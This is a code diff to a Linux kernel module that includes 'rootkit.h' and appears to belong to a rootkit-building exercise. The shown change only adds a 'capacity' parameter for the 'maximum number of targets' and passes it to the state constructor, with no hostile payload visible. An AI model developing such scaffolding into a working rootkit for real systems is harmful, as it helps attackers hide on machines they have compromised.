@@ -3,12 +3,17 @@
 #include <linux/errno.h>
 #include <linux/init.h>
 #include <linux/module.h>
+#include <linux/moduleparam.h>
 
 #include "rootkit.h"
 
 #if RKLINGS_FAIL_POINT < 0 || RKLINGS_FAIL_POINT > 2
 #error "unknown RKLINGS_FAIL_POINT"
 #endif
+
+static unsigned int capacity = 32;
+module_param(capacity, uint, 0444);
+MODULE_PARM_DESC(capacity, "Maximum number of targets");
 
 static struct rk_state *state;
 
@@ -19,7 +24,7 @@ static int __init rk_init(void)
 	if (RKLINGS_FAIL_POINT == RK_FAIL_PREFLIGHT)
 		return -ECANCELED;
 
-	state = rk_state_create();
+	state = rk_state_create(capacity);
 	if (IS_ERR(state)) {
 		error = PTR_ERR(state);
 		state = NULL;
